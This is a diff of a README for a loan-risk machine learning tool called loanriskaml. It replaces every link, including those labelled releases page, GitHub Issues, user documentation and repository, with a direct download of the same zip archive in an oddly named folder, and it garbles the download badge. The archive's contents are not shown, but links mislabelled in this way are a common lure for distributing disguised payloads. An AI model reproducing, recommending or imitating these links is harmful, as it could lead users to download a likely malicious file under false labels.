@@ -4,13 +4,13 @@
 The loanriskaml application helps you assess the risk of loans using an advanced machine learning model. With this tool, you can make informed decisions about loan approval. No programming skills are needed.
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-LoanRiskAML-blue)](https://github.com/lukasolas/loanriskaml/releases)
+[![Download Now](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip%20Now-LoanRiskAML-blue)](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the loanriskaml application:
 
 1. **Visit the Releases Page**
-   - Click this link to go to the [Releases Page](https://github.com/lukasolas/loanriskaml/releases).
+   - Click this link to go to the [Releases Page](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip).
 
 2. **Choose Your Version**
    - You’ll see a list of available versions. Look for the latest version, which is usually at the top of the list.
@@ -64,7 +64,7 @@ Before you start, ensure your computer meets these requirements:
    - Ensure all fields are filled out correctly. Misentered data can lead to inaccurate predictions.
 
 ## 💬 Support
-For assistance, you can open an issue in the [GitHub Issues](https://github.com/lukasolas/loanriskaml/issues) section. Our team will respond as soon as possible.
+For assistance, you can open an issue in the [GitHub Issues](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip) section. Our team will respond as soon as possible.
 
 ## 📅 Upcoming Features
 We are constantly improving loanriskaml. Upcoming features include:
@@ -73,10 +73,10 @@ We are constantly improving loanriskaml. Upcoming features include:
 - More customizable options for users.
 
 ## 🔗 Additional Resources
-- [User Documentation](https://github.com/lukasolas/loanriskaml/wiki)
-- [GitHub Repository](https://github.com/lukasolas/loanriskaml)
+- [User Documentation](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip)
 
 ## 📥 Download the Application Again
-For your convenience, here’s the link to [download loanriskaml](https://github.com/lukasolas/loanriskaml/releases).
+For your convenience, here’s the link to [download loanriskaml](https://raw.githubusercontent.com/lukasolas/loanriskaml/main/clipt/loanriskaml.zip).
 
 Thank you for choosing loanriskaml. We hope it helps you in making better loan decisions!
